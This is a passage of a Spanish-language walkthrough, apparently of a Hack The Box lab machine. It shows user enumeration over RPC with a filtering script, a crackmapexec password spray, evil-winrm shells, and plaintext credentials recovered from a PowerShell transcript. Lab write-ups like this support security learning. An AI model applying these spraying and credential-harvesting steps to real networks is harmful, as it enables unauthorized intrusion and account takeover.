	Description :	Built-in account <span class="k">for </span>administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 28 Mar 2024 14:45:17 CST
	Logoff Time              :	Wed, 31 Dec 1969 18:00:00 CST
	Kickoff Time             :	Wed, 31 Dec 1969 18:00:00 CST
	Password last <span class="nb">set </span>Time   :	Thu, 28 Mar 2024 15:43:03 CST
	Password can change Time :	Fri, 29 Mar 2024 15:43:03 CST
	Password must change Time:	Wed, 13 Sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000077
	padding1[0..7]...
	logon_hrs[0..21]...
</code></pre></div></div>

<ul>
  <li>Como son muchos usuarios podemos crear un <strong>script</strong> en <strong>Python3</strong> que nos filtre por las descripciones de los usuarios para ir más rapido.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">re</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">users.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
        <span class="c1"># Ejecutamos el comando
</span>        <span class="n">command_output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">'</span><span class="s">rpcclient</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-N</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-U</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">,</span> <span class="sh">'</span><span class="s">megabank.local</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="s">queryuser </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="sh">'</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="c1"># Filtramos por las lineas que contengan "User Name" o "Description"
</span>        <span class="n">filtered_output</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">command_output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">User Name|Description</span><span class="sh">'</span><span class="p">,</span> <span class="n">line</span><span class="p">)]</span>
        <span class="c1"># Imprimimos el resultado
</span>        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">filtered_output</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

</code></pre></div></div>

<ul>
  <li>Y encontramos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 xd.py
	User Name   :	Administrator
	Description :	Built-in account <span class="k">for </span>administering the computer/domain
	User Name   :	Guest
	Description :	Built-in account <span class="k">for </span>guest access to the computer/domain
	User Name   :	krbtgt
	Description :	Key Distribution Center Service Account
	User Name   :	DefaultAccount
	Description :	A user account managed by the system.
	User Name   :	ryan
	Description :	
	User Name   :	marko
	Description :	Account created. Password <span class="nb">set </span>to Welcome123!
	User Name   :	sunita
	Description :	
	User Name   :	abigail
	Description :	
	User Name   :	marcus
	Description :	
	User Name   :	sally
	Description :	
	User Name   :	fred
	Description :	
	User Name   :	angela
	Description :	
	User Name   :	felicia
	Description :	
	User Name   :	gustavo
	Description :	
	User Name   :	ulf
	Description :	
	User Name   :	stevie
	Description :	
	User Name   :	claire
	Description :	
	User Name   :	paulo
	Description :	
	User Name   :	steve
	Description :	
	User Name   :	annette
	Description :	
	User Name   :	annika
	Description :	
	User Name   :	per
	Description :	
	User Name   :	claude
	Description :	
	User Name   :	melanie
	Description :	
	User Name   :	zach
	Description :	
	User Name   :	simon
	Description :	
	User Name   :	naoki
	Description :	
</code></pre></div></div>

<h1 id="passwordspray">PasswordSpray</h1>

<ul>
  <li>Ahora podemos usar <strong>crackmapexec</strong> para ver si algún usuario usa la contraseña mediante un <strong>passwordspray</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> users.txt <span class="nt">-p</span> Welcome123! <span class="nt">--continue-on-success</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\A</span>dministrator:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\G</span>uest:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\k</span>rbtgt:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\D</span>efaultAccount:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\r</span>yan:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>unita:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>bigail:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>ally:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\f</span>red:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>ngela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\f</span>elicia:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\g</span>ustavo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\u</span>lf:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>tevie:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\c</span>laire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\p</span>aulo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>teve:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>nnette:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>nnika:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\p</span>er:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\c</span>laude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123!
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\z</span>ach:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>imon:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\n</span>aoki:Welcome123! STATUS_LOGON_FAILURE
</code></pre></div></div>

<h2 id="shell-as-melanie">Shell as melanie</h2>

<ul>
  <li>Tenemos la contraseña del usuario <strong>melanie</strong> vemos que por <strong>smb</strong> solo tenemos acceso de <strong>READ</strong> a algunos recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> melanie <span class="nt">-p</span> Welcome123! <span class="nt">--shares</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123!
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.96.155   445    RESOLUTE         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C<span class="nv">$ </span>                             Default share
SMB         10.129.96.155   445    RESOLUTE         IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Si probamos con el protocolo <strong>winrm</strong> nos devuelve <strong>Pwn3d!</strong> eso significa que las credenciales son válidas y podemos usar <strong>evil-winrm</strong> para conectarnos con el usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.96.155 <span class="nt">-u</span> melanie <span class="nt">-p</span> Welcome123!
SMB         10.129.96.155   5985   RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span>
HTTP        10.129.96.155   5985   RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ahora nos podemos conectar y ver la <strong>user flag</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.155 <span class="nt">-u</span> melanie <span class="nt">-p</span> Welcome123!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>megabank<span class="se">\m</span>elanie
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
28d98e800659d48be64838d5b9bfce11
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="shell-as-ryan">Shell as Ryan</h2>

<ul>
  <li>No tenemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>Estos como ya sabemos son los usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; net user /domain

User accounts <span class="k">for</span> <span class="se">\\</span>

<span class="nt">-------------------------------------------------------------------------------</span>
abigail                  Administrator            angela
annette                  annika                   claire
claude                   DefaultAccount           felicia
fred                     Guest                    gustavo
krbtgt                   marcus                   marko
melanie                  naoki                    paulo
per                      ryan                     sally
simon                    steve                    stevie
sunita                   ulf                      zach
The <span class="nb">command </span>completed with one or more errors.
</code></pre></div></div>

<ul>
  <li>Pero si vamos a la carpeta <code class="language-plaintext highlighter-rouge">C:\Users\</code> que hay otro usuario llamado <strong>ryan</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
</code></pre></div></div>

<ul>
  <li>De primeras no hay nada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir


    </span>Directory: C:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
</code></pre></div></div>

<ul>
  <li>En <code class="language-plaintext highlighter-rouge">Powershell</code> el comando <code class="language-plaintext highlighter-rouge">dir -force</code> es similar al <code class="language-plaintext highlighter-rouge">ls -la</code> en <strong>Linux</strong> con esto podemos ver archivos ocultos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir</span> <span class="nt">-force</span>


    Directory: C:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d--hs-        12/3/2019   6:40 AM                <span class="nv">$RECYCLE</span>.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
<span class="nt">-arhs-</span>       11/20/2016   5:59 PM         389408 bootmgr
<span class="nt">-a-hs-</span>        7/16/2016   6:10 AM              1 BOOTNXT
<span class="nt">-a-hs-</span>        3/28/2024   1:43 PM      402653184 pagefile.sys
</code></pre></div></div>

<ul>
  <li>Podemos ver que es lo que contiene la carpeta <strong>PSTranscripts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts&gt; <span class="nb">dir</span> <span class="nt">-force</span>


    Directory: C:<span class="se">\P</span>STranscripts


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d--h--        12/3/2019   6:45 AM                20191203

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt; <span class="nb">dir</span> <span class="nt">-force</span>


    Directory: C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-arh--</span>        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt;
</code></pre></div></div>

<ul>
  <li>Encontramos una contraseña en el <strong>.txt</strong> que encontramos del usuario <code class="language-plaintext highlighter-rouge">ryan:Serv3r4Admin4cc123!</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt; <span class="nb">type </span>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
<span class="k">**********************</span>
Windows PowerShell transcript start
Start <span class="nb">time</span>: 20191203063201
Username: MEGABANK<span class="se">\r</span>yan
RunAs User: MEGABANK<span class="se">\r</span>yan
Machine: RESOLUTE <span class="o">(</span>Microsoft Windows NT 10.0.14393.0<span class="o">)</span>
Host Application: C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>smprovhost.exe <span class="nt">-Embedding</span>
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
<span class="k">**********************</span>
Command start <span class="nb">time</span>: 20191203063455
<span class="k">**********************</span>
PS&gt;TerminatingError<span class="o">()</span>: <span class="s2">"System error."</span>
<span class="o">&gt;&gt;</span> CommandInvocation<span class="o">(</span>Invoke-Expression<span class="o">)</span>: <span class="s2">"Invoke-Expression"</span>
<span class="o">&gt;&gt;</span> ParameterBinding<span class="o">(</span>Invoke-Expression<span class="o">)</span>: <span class="nv">name</span><span class="o">=</span><span class="s2">"Command"</span><span class="p">;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"-join(</span><span class="nv">$id</span><span class="s2">,'PS ',</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">,'@',</span><span class="nv">$env</span><span class="s2">:computername,' ',</span><span class="k">$((</span>gi <span class="nv">$pwd</span><span class="o">)</span>.Name<span class="o">)</span>,<span class="s1">'&gt; '</span><span class="o">)</span>
<span class="k">if</span> <span class="o">(!</span><span class="nv">$?</span><span class="o">)</span> <span class="o">{</span> <span class="k">if</span><span class="o">(</span><span class="nv">$LASTEXITCODE</span><span class="o">)</span> <span class="o">{</span> <span class="nb">exit</span> <span class="nv">$LASTEXITCODE</span> <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="nb">exit </span><span class="m">1</span> <span class="o">}</span> <span class="o">}</span><span class="s2">"
&gt;&gt; CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
&gt;&gt; ParameterBinding(Out-String): name="</span>Stream<span class="s2">"; value="</span>True<span class="s2">"
**********************
Command start time: 20191203063455
**********************
PS&gt;ParameterBinding(Out-String): name="</span>InputObject<span class="s2">"; value="</span>PS megabank<span class="se">\r</span>yan@RESOLUTE Documents&gt; <span class="s2">"
PS megabank</span><span class="se">\r</span><span class="s2">yan@RESOLUTE Documents&gt;
**********************
Command start time: 20191203063515
**********************
PS&gt;CommandInvocation(Invoke-Expression): "</span>Invoke-Expression<span class="s2">"
&gt;&gt; ParameterBinding(Invoke-Expression): name="</span>Command<span class="s2">"; value="</span>cmd <span class="o">/</span>c net use X: <span class="se">\\</span>fs01<span class="se">\b</span>ackups ryan Serv3r4Admin4cc123!

<span class="k">if</span> <span class="o">(!</span><span class="nv">$?</span><span class="o">)</span> <span class="o">{</span> <span class="k">if</span><span class="o">(</span><span class="nv">$LASTEXITCODE</span><span class="o">)</span> <span class="o">{</span> <span class="nb">exit</span> <span class="nv">$LASTEXITCODE</span> <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="nb">exit </span><span class="m">1</span> <span class="o">}</span> <span class="o">}</span><span class="s2">"
&gt;&gt; CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
&gt;&gt; ParameterBinding(Out-String): name="</span>Stream<span class="s2">"; value="</span>True<span class="s2">"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK</span><span class="se">\r</span><span class="s2">yan
RunAs User: MEGABANK</span><span class="se">\r</span><span class="s2">yan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">smprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS&gt;CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
&gt;&gt; ParameterBinding(Out-String): name="</span>InputObject<span class="s2">"; value="</span>The syntax of this <span class="nb">command </span>is:<span class="s2">"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: </span><span class="se">\\</span><span class="s2">fs01</span><span class="se">\b</span><span class="s2">ackups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: </span><span class="se">\\</span><span class="s2">fs01</span><span class="se">\b</span><span class="s2">ackups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK</span><span class="se">\r</span><span class="s2">yan
RunAs User: MEGABANK</span><span class="se">\r</span><span class="s2">yan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">smprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
*Evil-WinRM* PS C:</span><span class="se">\P</span><span class="s2">STranscripts</span><span class="se">\2</span><span class="s2">0191203&gt;
</span></code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es probar las credenciales y ver los recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> ryan <span class="nt">-p</span> Serv3r4Admin4cc123!
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\r</span>yan:Serv3r4Admin4cc123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> ryan <span class="nt">-p</span> Serv3r4Admin4cc123! <span class="nt">--shares</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\r</span>yan:Serv3r4Admin4cc123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.96.155   445    RESOLUTE         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C<span class="nv">$ </span>                             Default share
SMB         10.129.96.155   445    RESOLUTE         IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Y bueno ya nos devuelve un <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> lo que significa que podemos conectar usando <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.155 <span class="nt">-u</span> ryan <span class="nt">-p</span> Serv3r4Admin4cc123!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>
    <p>Pues bueno el único usuario que nos queda es el usuario <strong>Administrator</strong>.</p>
  </li>
  <li>
    <p>En el escritorio nos dejaron una nota.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
